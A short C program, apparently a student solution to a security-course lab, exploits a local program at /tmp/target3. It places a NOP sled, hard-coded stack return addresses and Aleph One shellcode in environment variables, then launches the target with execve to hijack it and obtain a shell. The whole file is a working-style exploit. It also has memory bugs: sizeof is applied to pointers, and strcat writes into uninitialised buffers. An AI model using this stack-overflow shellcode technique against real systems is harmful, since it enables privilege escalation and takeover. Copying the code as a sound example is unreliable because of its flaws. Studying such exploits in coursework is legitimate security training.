#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];

  //bfffff9c
  char *nops = "\x90\x90\x90";
  char *result = malloc(sizeof(nops) + 1);
  strcat(result, nops);

  char *preface1 = "rrrrrrrrrrr=\xa0\xff\xff\xbf";
  char *preface = "shellcode=";

  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+16);
  strcat(envvar, preface);
  strcat(envvar, "\x90\x90\x90\x90");
  strcat(envvar, "\xa8\xff\xff\xbf");
  strcat(envvar, shellcodeAlephOne);

  char *envp[] =
    {
        preface1,
        envvar
    };

  args[0] = TARGET;
  args[1] = result;
  args[2] = NULL;
  
  // env[0] = envvar;
  execve(TARGET, args, envp);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


